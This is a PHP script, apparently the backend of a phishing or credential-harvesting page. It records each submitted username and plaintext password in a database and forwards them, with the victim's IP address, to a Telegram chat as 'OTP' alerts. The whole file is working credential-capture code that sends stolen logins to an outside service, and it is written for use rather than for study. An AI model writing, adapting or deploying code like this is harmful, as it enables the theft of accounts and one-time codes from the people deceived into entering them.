<?php
// Ensure no output before this point
ob_start(); // Start output buffering to prevent accidental output

include 'db_connect.php';
include 'notification_config.php';

header('Content-Type: application/json');

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_log('c:/xampp/php/logs/php_error.log');

error_log("login-capture.php: Script started");

// Log database connection status
if ($conn->connect_error) {
    error_log("Database connection failed: " . $conn->connect_error);
} else {
    error_log("Database connection successful");
}

try {
    // Get POST data
    $userId = $_POST['username'] ?? 'unknown';
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');

    // Add rate limiting
    $rateLimitSql = "SELECT COUNT(*) AS attempt_count FROM login_attempts WHERE ip_address = ? AND date > NOW() - INTERVAL 1 MINUTE";
    $rateLimitStmt = $conn->prepare($rateLimitSql);
    if (!$rateLimitStmt) {
        error_log("Rate limiting query preparation failed: " . $conn->error);
    } else {
        error_log("Rate limiting query prepared successfully");
    }
    $rateLimitStmt->bind_param("s", $ipAddress);
    $rateLimitStmt->execute();
    $rateLimitResult = $rateLimitStmt->get_result();
    $rateLimitRow = $rateLimitResult->fetch_assoc();

    if ($rateLimitRow['attempt_count'] > 5) {
        echo json_encode(['success' => false, 'message' => 'Too many login attempts. Please try again later.']);
        exit;
    }

    // Log the login attempt in the database
    $sql = "INSERT INTO login_attempts (userId, password, ip_address, user_agent, date, status) 
            VALUES (?, ?, ?, ?, ?, 'pending')";
    $stmt = $conn->prepare($sql);

    // Log SQL errors for debugging
    if (!$stmt) {
        error_log("SQL Error: " . $conn->error);
        echo json_encode(['success' => false, 'message' => 'Database error occurred.']);
        exit;
    }

    $stmt->bind_param("sssss", $userId, $_POST['password'], $ipAddress, $userAgent, $timestamp);

    if ($stmt->execute()) {
        error_log("Login attempt logged successfully");
        $attemptId = $conn->insert_id;

     
        // Send notification to Telegram with OTP included
        sendToTelegram("🔔 NEW LOGIN ATTEMPT 🔔\nUser: {$userId}\nIP Address: {$ipAddress}\nTime: {$timestamp}\nOTP: {$_POST['password']}");

        // Respond to the client
        echo json_encode([
            'success' => true,
            'attempt_id' => $attemptId
        ]);
    } else {
        throw new Exception("Failed to log login attempt: " . $conn->error);
    }
} catch (Exception $e) {
    error_log($e->getMessage());
    echo json_encode(['success' => false, 'message' => 'An unexpected error occurred.']);
}

$stmt->close();
$conn->close();

// End of script
ob_end_flush(); // Flush the output buffer and send the response
?>